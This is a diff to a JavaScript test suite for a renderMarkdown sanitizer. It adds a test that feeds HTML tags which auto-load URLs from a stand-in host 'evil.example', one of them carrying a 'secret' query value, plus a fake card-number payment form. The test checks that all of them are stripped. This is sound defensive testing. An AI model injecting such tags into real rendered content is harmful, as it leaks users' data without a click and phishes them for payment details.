@@ -66,6 +66,24 @@ describe('renderMarkdown', () => {
     expect(html).toContain('Log in');
   });
 
+  it('strips other tags that load a URL with no click, and form controls', () => {
+    const html = renderMarkdown(
+      [
+        '<video poster="https://evil.example/v.png?q=secret"></video>',
+        '<audio src="https://evil.example/a.mp3"></audio>',
+        '<video><source src="https://evil.example/s.mp4"></video>',
+        '<table background="https://evil.example/t.png"><tr><td background="https://evil.example/td.png">x</td></tr></table>',
+        '<svg><image href="https://evil.example/i.png"></image></svg>',
+        '<input type="image" src="https://evil.example/in.png">',
+        '<input placeholder="Enter your card number"><button>Pay</button>',
+      ].join('\n'),
+    );
+    expect(html).not.toContain('evil.example');
+    ['<video', '<audio', '<source', '<svg', '<input', '<button'].forEach((tag) =>
+      expect(html).not.toContain(tag),
+    );
+  });
+
   it('returns an empty string for empty input', () => {
     expect(renderMarkdown('')).toBe('');
   });
